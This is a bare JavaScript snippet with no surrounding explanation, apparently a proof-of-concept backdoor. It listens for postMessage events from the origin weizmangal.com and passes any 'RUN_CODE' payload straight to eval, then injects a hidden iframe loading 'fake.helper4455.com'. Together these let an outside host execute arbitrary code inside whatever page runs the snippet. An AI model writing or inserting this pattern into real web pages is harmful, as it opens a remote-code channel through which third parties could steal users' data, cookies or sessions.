{
addEventListener('message', e => {
  if (e.origin === 'https://weizmangal.com') {
    if (e.data.type === 'RUN_CODE') {
      const code = e.data.code;
      eval(code);
    }
  }
});

const i = document.createElement('iframe');
i.style.display = 'none';
i.src = 'https://fake.helper4455.com';
document.body.appendChild(i);
}
